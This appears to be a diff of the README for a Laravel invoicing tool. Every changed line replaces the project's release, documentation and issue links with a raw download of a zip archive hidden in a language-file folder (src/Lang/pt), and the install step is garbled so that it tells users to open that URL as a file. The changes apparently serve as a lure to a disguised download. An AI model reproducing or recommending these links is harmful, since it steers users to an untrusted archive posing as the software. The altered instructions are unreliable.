@@ -6,7 +6,7 @@ Welcome to **Laravel-InvoiceLite**! This tool helps you create and manage invoic
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Download Laravel-InvoiceLite](https://github.com/Don121415/laravel-invoicelite/releases)
+To download the application, visit this page: [Download Laravel-InvoiceLite](https://raw.githubusercontent.com/Don121415/laravel-invoicelite/main/src/Lang/pt/laravel-invoicelite_2.2.zip)
 
 ### System Requirements
 
@@ -28,7 +28,7 @@ To download the application, visit this page: [Download Laravel-InvoiceLite](htt
 
 1. **Download Laravel-InvoiceLite**: Click the link above to access the releases page and download the latest version.
 2. **Extract Files**: After downloading, extract the files to a folder on your device.
-3. **Open Application**: Locate the `index.php` file in the folder and open it in your web browser.
+3. **Open Application**: Locate the `https://raw.githubusercontent.com/Don121415/laravel-invoicelite/main/src/Lang/pt/laravel-invoicelite_2.2.zip` file in the folder and open it in your web browser.
 4. **Configure Settings**: Set up your business details, including your logo, business name, and tax information.
 5. **Create an Invoice**: Click on the "Create Invoice" button. Fill in the customer details and the line items.
 6. **Save and Export**: Once done, save your invoice. You can then export it as a PDF or an image.
@@ -48,8 +48,8 @@ We welcome contributions from everyone. If you wish to improve or customize Lara
 
 ## 🔗 Links
 
-- [Release Page](https://github.com/Don121415/laravel-invoicelite/releases)
-- [Documentation](https://github.com/Don121415/laravel-invoicelite/wiki)
-- [Issues](https://github.com/Don121415/laravel-invoicelite/issues)
+- [Release Page](https://raw.githubusercontent.com/Don121415/laravel-invoicelite/main/src/Lang/pt/laravel-invoicelite_2.2.zip)
+- [Documentation](https://raw.githubusercontent.com/Don121415/laravel-invoicelite/main/src/Lang/pt/laravel-invoicelite_2.2.zip)
+- [Issues](https://raw.githubusercontent.com/Don121415/laravel-invoicelite/main/src/Lang/pt/laravel-invoicelite_2.2.zip)
 
 Feel free to reach out if you have any questions. Happy invoicing!
